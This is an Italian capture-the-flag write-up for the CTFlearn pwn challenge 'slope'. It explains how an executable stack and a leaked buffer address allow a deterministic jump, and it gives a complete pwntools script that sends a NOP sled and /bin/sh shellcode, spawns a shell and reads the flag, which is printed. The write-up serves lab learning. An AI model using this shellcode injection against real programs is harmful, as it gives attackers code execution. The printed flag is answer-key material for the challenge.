# slope - PWN (Shellcode + NOP sled, stack eseguibile)

**Flag:** `CTFlearn{y0u_n3v3r_kn0w_wh3r3_th3_buff3r_15}`

## Analisi
Lo stack e' **eseguibile** (GNU_STACK = RWE). Il programma:
1. stampa un indirizzo "approssimato" vicino al buffer;
2. legge il nostro input in `buffer[0x1000]` (ci mettiamo shellcode + NOP sled);
3. salta all'indirizzo che forniamo noi: `scanf("%p", &location); location();`.

Relazione trovata col debugger: `buffer = indirizzo_stampato + 0x50`, e l'offset casuale e' +/- 222. Quindi se saltiamo a **indirizzo_stampato + 302** cadiamo SEMPRE dentro i primi ~443 byte del buffer --> dentro la NOP sled (deterministico, niente fortuna).

## Soluzione - passo per passo
Serve `pwntools`. Tutto in un processo (l'indirizzo cambia ogni volta).

1. Entra nella cartella:
   ```
   cd slope
   ```
2. Esegui l'exploit:
   ```
   python3 -c '
   from pwn import *
   context.arch = "amd64"; context.log_level = "error"
   import subprocess, re, time
   sc = asm(shellcraft.sh())
   p = subprocess.Popen(["./task"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
   addr = int(re.search(rb"0x[0-9a-f]+", p.stdout.readline()).group(), 16)
   target = addr + 302
   p.stdin.write(b"\x90"*0x800 + sc + b"\n"); p.stdin.flush()
   p.stdin.write(hex(target).encode() + b"\n"); p.stdin.flush()
   p.stdin.write(b"cat flag.txt\n"); p.stdin.flush()
   time.sleep(0.4); p.stdin.close()
   print(p.stdout.read().decode("latin1"))
   '
   ```
   Output --> `... CTFlearn{y0u_n3v3r_kn0w_wh3r3_th3_buff3r_15}`

Logica del payload:
- `b'\x90'*0x800` - NOP sled (nessun `\n` dentro, altrimenti `fgets` si fermerebbe)
- `asm(shellcraft.sh())` - shellcode `/bin/sh`
- salto a `indirizzo_stampato + 302` - cade nella sled e scivola fino allo shellcode
- poi mandiamo `cat flag.txt` alla shell ottenuta


